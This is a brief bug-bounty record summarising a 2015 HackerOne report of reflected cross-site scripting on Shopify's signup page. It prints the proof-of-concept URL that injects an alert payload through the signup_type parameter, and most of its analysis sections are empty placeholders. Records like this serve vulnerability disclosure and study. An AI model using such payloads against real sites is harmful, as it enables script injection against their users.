# XSS https://www.shopify.com/signup

## Metadata
- **Source:** HackerOne
- **Report:** 85291 | https://hackerone.com/reports/85291
- **Submitted:** 2015-08-27
- **Reporter:** mdv
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
https://www.shopify.com/signup?signup_type=%27|alert%28%27XSS%27%29|%27
Vulnerable param is signup_type. For the XSS i used '|alert('XSS')|'

Tested in Mozilla Firefox 40.0.3

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

https://www.shopify.com/signup?signup_type=%27|alert%28%27XSS%27%29|%27
Vulnerable param is signup_type. For the XSS i used '|alert('XSS')|'

Tested in Mozilla Firefox 40.0.3

</details>

---
*Analysed by Claude on 2026-05-24*
